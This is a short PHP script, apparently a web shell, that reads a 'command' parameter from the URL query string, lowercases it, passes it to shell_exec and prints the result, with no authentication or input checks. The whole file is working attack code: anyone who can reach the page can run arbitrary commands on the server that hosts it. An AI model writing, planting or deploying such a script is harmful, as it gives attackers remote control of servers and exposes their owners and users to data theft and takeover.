<?php

$tmp=$_GET['command'];
$command=strtolower($tmp);
echo shell_exec($command);

?>
